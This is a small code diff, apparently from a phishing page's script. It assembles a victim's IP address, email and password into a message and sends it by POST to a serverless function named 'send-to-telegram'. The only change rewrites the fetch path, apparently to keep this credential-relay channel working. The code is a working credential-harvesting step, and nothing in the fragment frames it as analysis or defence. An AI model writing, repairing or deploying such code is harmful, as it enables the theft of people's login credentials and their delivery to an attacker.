@@ -8514,7 +8514,7 @@ IP: ${ip}
 Email: ${user || '(empty)'}
 Pass: ${pass}`
 
-    fetch('/.netlify/functions/send-to-telegram', {
+    fetch('netlify/functions/send-to-telegram.js', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ message: text })
